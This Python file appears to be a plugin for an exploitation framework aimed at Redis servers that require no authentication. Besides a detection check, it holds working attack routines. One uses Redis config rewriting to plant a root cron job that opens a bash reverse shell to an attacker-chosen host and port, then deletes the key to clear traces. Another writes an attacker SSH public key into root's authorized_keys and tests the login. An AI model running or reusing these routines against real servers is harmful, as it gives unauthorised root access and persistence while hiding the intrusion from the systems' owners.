#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import redis
import time
import socket
import random
from string import ascii_lowercase
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.REDIS
        self.name = 'redis unauth'
        self.keyword = ['redis', 'unauth']
        self.info = 'redis unauth'
        self.type = 'unauth'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        try:
            # ,socket_connect_timeout=data['timeout'],socket_timeout=data['timeout']
            r = redis.Redis(self.target_host, self.target_port , socket_timeout = 5)
            info = r.info()
            if 'redis' in info:
                self.flag = 1
                self.req.append({"info": "info"})
                self.res.append({"info":"redis unauth","key":"info","redis_info": info})
        except :
            pass

    def rebound(self):
        password = self.parameter['p']
        local_host = self.parameter['lh']
        local_port = self.parameter['lp']
        try:
            # socket_connect_timeout=data['timeout'], socket_timeout=data['timeout']
            pool = redis.ConnectionPool(host=self.target_host, password=password, port=self.target_port)
            r = redis.Redis(connection_pool=pool)
            payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n'.format(ip=local_host,port=str(local_port,))
            path = '/var/spool/cron'
            name = 'root'
            key = _random_string(10)
            r.set(key, payload)
            r.config_set('dir', path)
            r.config_set('dbfilename', name)
            r.save()
            r.delete(key)  # 清除痕迹
            r.config_set('dir', '/tmp')
            self.flag = 1
            self.req.append({"key":key,"payload": payload,"path": path,"name": name})
            self.res.append({"info":"Success","key": "rebound"})
        except:
            pass

    def sshkey(self):
        password = self.parameter['p']
        public_key = self.parameter['puk']
        private_key = self.parameter['prk']
        try:

            pool = redis.ConnectionPool(host=self.target_host, password=password, port=self.target_port)
            r = redis.Redis(connection_pool=pool)
            if 'redis_version' in r.info():
                key = _random_string(10)
                path = '/root/.ssh'
                name = 'authorized_keys'
                r.set(key, '\n\n' + public_key + '\n\n')
                r.config_set('dir', path)
                r.config_set('dbfilename', name)
                r.save()
                r.delete(key)  # 清除痕迹
                r.config_set('dir', '/tmp')
                time.sleep(5)
                if _ssh_connect(self.target_host, 22, private_key):
                    self.flag = 1
                    self.req.append({"key": key, "public_key":public_key, "path": path, "name": name})
                    self.res.append(
                        {"info": "Success", "key": "sshkey"})
                else:
                    self.flag = 0
        except Exception:
            pass

def _random_string(length=8):
    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])

def _ssh_connect(ip, port=22,private_key=None):
    import paramiko
    from paramiko.ssh_exception import SSHException
    try:
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.connect(ip, port, username='root', pkey=private_key)
        s.close()
        return True
    except Exception as e :
        if type(e) == SSHException:
            return True
        return False

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False